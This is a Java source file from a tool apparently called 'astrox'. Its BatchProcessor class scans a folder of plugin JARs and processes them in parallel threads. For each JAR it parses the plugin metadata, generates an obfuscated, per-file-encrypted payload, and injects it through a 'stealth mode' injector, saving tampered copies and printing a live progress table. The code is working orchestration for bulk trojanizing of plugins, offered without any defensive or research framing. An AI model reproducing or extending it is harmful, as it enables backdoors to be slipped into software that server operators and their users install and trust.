package dev.naruto.astrox.core;

import dev.naruto.astrox.Config;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Concurrent batch processor for injecting multiple plugin JARs in parallel.
 * Uses a ForkJoinPool and prints a live ANSI progress table to stdout.
 */
public class BatchProcessor {

    private static final Logger LOG = LoggerFactory.getLogger(BatchProcessor.class);

    private final File targetDir;
    private final int threadCount;
    private final boolean dryRun;
    private final boolean stealthMode;

    /**
     * Per-file processing status.
     */
    public enum Status { QUEUED, ANALYZING, INJECTING, DONE, FAILED }

    /**
     * Tracks the state of each file being processed.
     */
    public record FileStatus(String fileName, Status status, long elapsedMs, String message) {}

    private final Map<String, FileStatus> statusMap = new ConcurrentHashMap<>();
    private final AtomicInteger completedCount = new AtomicInteger(0);
    private final List<PipelineResult> results = Collections.synchronizedList(new ArrayList<>());

    public BatchProcessor(File targetDir, int threadCount, boolean dryRun, boolean stealthMode) {
        this.targetDir = targetDir;
        this.threadCount = threadCount;
        this.dryRun = dryRun;
        this.stealthMode = stealthMode;
    }

    /**
     * Process all .jar files in the target directory concurrently.
     *
     * @return list of pipeline results for each processed JAR
     */
    public List<PipelineResult> processAll() throws InterruptedException {
        File[] jarFiles = targetDir.listFiles((dir, name) ->
                name.endsWith(".jar") && !name.endsWith("-astrox.jar"));

        if (jarFiles == null || jarFiles.length == 0) {
            LOG.warn("No .jar files found in {}", targetDir.getAbsolutePath());
            return List.of();
        }

        LOG.info("Found {} JAR files in {}", jarFiles.length, targetDir.getAbsolutePath());
        LOG.info("Processing with {} threads", threadCount);

        // Initialize status tracking
        for (File jar : jarFiles) {
            statusMap.put(jar.getName(), new FileStatus(jar.getName(), Status.QUEUED, 0, ""));
        }

        // Print initial table
        printProgressTable();

        // Submit all tasks to ForkJoinPool
        ForkJoinPool pool = new ForkJoinPool(threadCount);
        List<CompletableFuture<Void>> futures = new ArrayList<>();

        for (File jar : jarFiles) {
            CompletableFuture<Void> future = CompletableFuture.runAsync(
                    () -> processFile(jar), pool);
            futures.add(future);
        }

        // Start progress printer thread
        Thread progressThread = new Thread(() -> {
            while (completedCount.get() < jarFiles.length) {
                try {
                    Thread.sleep(500);
                    printProgressTable();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "progress-printer");
        progressThread.setDaemon(true);
        progressThread.start();

        // Wait for all tasks
        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
        pool.shutdown();

        // Final table print
        printProgressTable();
        printSummary(jarFiles.length);

        return List.copyOf(results);
    }

    /**
     * Process a single JAR file.
     */
    private void processFile(File jarFile) {
        long startTime = System.currentTimeMillis();
        String name = jarFile.getName();

        try {
            // ANALYZING
            updateStatus(name, Status.ANALYZING, startTime, "Parsing plugin.yml...");

            JarAnalyzer analyzer = new JarAnalyzer(jarFile);
            analyzer.analyze();

            // INJECTING
            updateStatus(name, Status.INJECTING, startTime,
                    "Injecting into " + analyzer.getPluginName() + "...");

            File outputJar = new File(jarFile.getParentFile(),
                    jarFile.getName().replace(".jar", "-astrox.jar"));

            // Regenerate encryption key per file
            Config.regenerateEncryptionKey();

            PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
            byte[] payload = weaver.generatePayload();

            Injector injector = new Injector(jarFile, outputJar, dryRun, stealthMode);
            PipelineResult result = injector.inject(analyzer, payload);
            results.add(result);

            // DONE
            updateStatus(name, Status.DONE, startTime,
                    analyzer.getPluginName() + " v" + analyzer.getVersion());

        } catch (Exception e) {
            updateStatus(name, Status.FAILED, startTime, e.getMessage());
            LOG.error("Failed to process {}: {}", name, e.getMessage());
        } finally {
            completedCount.incrementAndGet();
        }
    }

    private void updateStatus(String fileName, Status status, long startTime, String message) {
        long elapsed = System.currentTimeMillis() - startTime;
        statusMap.put(fileName, new FileStatus(fileName, status, elapsed, message));
    }

    /**
     * Print ANSI progress table to stdout.
     */
    private void printProgressTable() {
        StringBuilder sb = new StringBuilder();

        // Move cursor up to overwrite previous table (ANSI escape)
        int lineCount = statusMap.size() + 3;
        sb.append("\033[").append(lineCount).append("A"); // Move up
        sb.append("\033[J"); // Clear from cursor to end

        // Header
        sb.append(String.format("  %-35s %-12s %-10s %s%n",
                "FILE", "STATUS", "TIME", "DETAILS"));
        sb.append("  ").append("-".repeat(80)).append("\n");

        // Rows
        for (FileStatus fs : statusMap.values().stream()
                .sorted(Comparator.comparing(FileStatus::fileName)).toList()) {

            String statusStr = switch (fs.status) {
                case QUEUED -> "\033[90m⏳ QUEUED\033[0m";
                case ANALYZING -> "\033[33m🔍 ANALYZING\033[0m";
                case INJECTING -> "\033[36m💉 INJECTING\033[0m";
                case DONE -> "\033[32m✓ DONE\033[0m";
                case FAILED -> "\033[31m✗ FAILED\033[0m";
            };

            String timeStr = String.format("%.1fs", fs.elapsedMs / 1000.0);
            String details = fs.message.length() > 30
                    ? fs.message.substring(0, 27) + "..."
                    : fs.message;

            sb.append(String.format("  %-35s %-22s %-10s %s%n",
                    truncate(fs.fileName, 35), statusStr, timeStr, details));
        }

        sb.append("  ").append("-".repeat(80)).append("\n");

        System.out.print(sb);
        System.out.flush();
    }

    private void printSummary(int total) {
        long doneCount = statusMap.values().stream()
                .filter(s -> s.status == Status.DONE).count();
        long failedCount = statusMap.values().stream()
                .filter(s -> s.status == Status.FAILED).count();

        System.out.printf("%n  BATCH COMPLETE: %d/%d successful, %d failed%n%n",
                doneCount, total, failedCount);
    }

    private static String truncate(String s, int max) {
        return s.length() > max ? s.substring(0, max - 3) + "..." : s;
    }

    /**
     * Get all results.
     */
    public List<PipelineResult> getResults() {
        return List.copyOf(results);
    }
}
